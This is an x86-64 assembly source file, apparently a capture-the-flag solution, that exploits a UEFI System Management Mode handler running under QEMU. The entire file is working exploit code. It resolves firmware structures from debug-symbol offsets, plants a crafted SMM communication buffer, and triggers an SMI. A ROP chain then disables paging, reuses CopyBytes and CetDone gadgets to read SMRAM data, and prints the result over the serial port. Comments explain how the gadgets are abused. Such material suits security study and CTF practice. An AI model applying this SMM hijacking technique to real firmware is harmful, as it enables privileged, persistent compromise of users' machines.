# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

  .globl _start

// $ nm PiSmmIpl.debug | grep mSmmCorePrivateData
mSmmCorePrivateData = 0x0000000000007140
// $ gdb PiSmmIpl.debug -ex 'ptype /o mSmmCorePrivateData' -batch
CommunicationBuffer = 56
BufferSize = 64

BootServices = 96
// $ gdb PiSmmIpl.debug -ex 'ptype /o gBS' -batch
AllocatePool = 64
HandleProtocol = 152
LocateHandleBuffer = 312
LocateProtocol = 320

// EFI_LOADED_IMAGE_PROTOCOL
FilePath = 32
ImageBase = 64
// MEDIA_FW_VOL_FILEPATH_DEVICE_PATH
FvFileName = 4

// SMM_CPU_PRIVATE_DATA
SmmConfiguration = 112

EfiRuntimeServicesData = 6
ByProtocol = 2

// $ nm PiSmmCpuDxeSmm.debug | grep -P 'InternalLongJump|CetDone'
CetDone = 0x00000000000108f0
// $ nm PiSmmCpuDxeSmm.debug | grep Base
Base = 0x000000000001028a
// $ nm PiSmmCpuDxeSmm.debug | grep mSmmCpuPrivateData
mSmmCpuPrivateData = 0x00000000000161a0
// $ nm PiSmmCpuDxeSmm.debug | grep CopyBytes
CopyBytes = 0x0000000000010853

GAD_rsm = 0x10139

_start:
  mov %rsp,%rbp
  and $-16,%rsp

  mov $ByProtocol,%rcx
  lea gEfiLoadedImageProtocolGuid(%rip),%rdx
  mov $0,%r8
  lea HandleBufferSize(%rip),%r9
  lea HandleBuffer(%rip),%rax
  push %rax
  sub $32,%rsp

  mov BootServices(%rbx),%rax
  call *LocateHandleBuffer(%rax)
  test %rax,%rax
  jne bad

  xor %r12,%r12

find_loop:
  cmp %r12,HandleBufferSize(%rip)
  je bad

  mov HandleBuffer(%rip),%rcx
  mov (%rcx,%r12,8),%rcx
  lea gEfiLoadedImageProtocolGuid(%rip),%rdx
  lea LoadedImage(%rip),%r8
  mov BootServices(%rbx),%rax
  call *HandleProtocol(%rax)
  test %rax,%rax
  jne bad

  mov LoadedImage(%rip),%rax
  mov FilePath(%rax),%rax
  lea FvFileName(%rax),%rsi
  lea PiSmmIplGuid(%rip),%rdi
  mov $16,%rcx
  repe cmpsb
  jz find_loop_done

  inc %r12
  jmp find_loop

find_loop_done:
  mov LoadedImage(%rip),%r13
  mov ImageBase(%r13),%r13
  lea mSmmCorePrivateData(%r13),%r13

  lea gEfiSmmConfigurationProtocolGuid(%rip),%rcx
  mov $0,%rdx
  lea mSmmConfiguration(%rip),%r8
  mov BootServices(%rbx),%rax
  call *LocateProtocol(%rax)
  test %rax,%rax
  jne bad

  mov mSmmConfiguration(%rip),%r14
  lea -SmmConfiguration(%r14),%r14
  lea -mSmmCpuPrivateData(%r14),%r14

  lea ropchain(%rip),%rax
  mov %rax,fill_ropchain(%rip)
  lea buffer_end(%rip),%rax
  mov %rax,fill_buffer_end(%rip)
  lea Base(%r14),%rax
  lea 25(%rax),%rax
  mov %rax,fill_base(%rip)
  lea CetDone(%r14),%rax
  mov %rax,fill_cetdone(%rip)

  lea CopyBytes+1(%r14),%rax
  mov %eax,fill_copybytes(%rip)

  lea GAD_rsm(%r14),%rax
  mov %eax,fill_rsm(%rip)

  mov $EfiRuntimeServicesData,%rcx
  mov $(buffer_end - buffer),%rdx
  lea buffer_send(%rip),%r8

  mov BootServices(%rbx),%rax
  call *AllocatePool(%rax)
  test %rax,%rax
  jne bad

  lea buffer(%rip),%rsi
  mov buffer_send(%rip),%rdi
  mov $(buffer_end - buffer),%rcx
  rep movsb

  mov buffer_send(%rip),%rax
  movq %rax,CommunicationBuffer(%r13)
  movq $(buffer_end - buffer),BufferSize(%r13)

  xor %eax,%eax
  outb %al,$0xB3
  outb %al,$0xB2

  // Need a jump to guarantee a switch to SMI handler for QEMU
  jmp fin_smi
fin_smi:

  lea buffer_end(%rip),%esi
  mov $0x3f8,%dx
print_loop:
  lodsb
  outb %al,(%dx)
  test %al,%al
  jz print_loop_done
  jmp print_loop

print_loop_done:
  mov %rbp,%rsp
  ret

bad:
  hlt
  jmp .

buffer_send:
  .quad 0
HandleBufferSize:
  .quad 0
HandleBuffer:
  .quad 0
LoadedImage:
  .quad 0
mSmmConfiguration:
  .quad 0

gEfiLoadedImageProtocolGuid:
  .long 0x5B1B31A1
  .short 0x9562
  .short 0x11D2
  .byte 0x8E, 0x3F, 0x00, 0xA0, 0xC9, 0x69, 0x72, 0x3B

PiSmmIplGuid:
  .long 0x2FA2A6DA
  .short 0x11D5
  .short 0x4dc3
  .byte 0x99, 0x9A, 0x74, 0x96, 0x48, 0xB0, 0x3C, 0x56

gEfiSmmConfigurationProtocolGuid:
  .long 0x26eeb3de
  .short 0xb689
  .short 0x492e
  .byte 0x80, 0xf0, 0xbe, 0x8b, 0xd7, 0xda, 0x4b, 0xa7

buffer:
  .long 0x9a75cf12
  .short 0x2c83
  .short 0x4d10
  .byte 0xb5, 0xa8, 0x35, 0x75, 0x54, 0x65, 0x92, 0xf7

  .quad buffer_end - message
message:
  .quad 0x0000000080010033 & ~0x80000000 // RBX -> CR0
fill_ropchain:
  .quad -1 // RSP
  .quad 0 // RBP
fill_buffer_end:
  .quad -1 // RDI
  .quad 0x44440000 // RSI
  .quad 0 // R12
  .quad 0 // R13
  .quad 0 // R14
  .quad 0 // R15
fill_base:
  .quad -1 // RIP

ropchain:

  // A detail here about why we can use copybytes without explicit ECX:
  // CopyBytes is written as NASM:
  // @CopyBytes:
  //   mov rcx, r8
  // This compiles to GAS:
  // 000000000000fc83 <@CopyBytes>:
  //   fc83: 4c 89 c1     mov %r8,%rcx
  // But since we disabled paging we are in 32 bit protected mode,
  // and this becomes:
  // 000000000000fc83 <@CopyBytes>:
  //   fc83: 4c           dec    %esp
  //   fc84: 89 c1        mov    %eax,%ecx
  // So we need some form of EAX control.
  // EAX is coincidentally set in LongJump CetDone, with NASM:
  //   mov rax, rdx
  // While there is a pop rdx immediately preceding CetDone, we don't
  // have stack control prior to CetDone. But do we have control over
  // RDX? Yes. The calling convention puts the second argument to
  // mDebugData.CowsayFunc, i.e. TempCommBufferSize, in RDX, and
  // our buffer length is more than enough for the flag.

fill_copybytes:
  .long -1
  .long 0x8 // CS

  .long -1 // pop edi
  .long -1 // pop esi

fill_rsm:
  .long -1

  .rept 400 - (. - message)
  .byte 0
  .endr

fill_cetdone:
  .quad -1
  .byte 0x00
buffer_end:
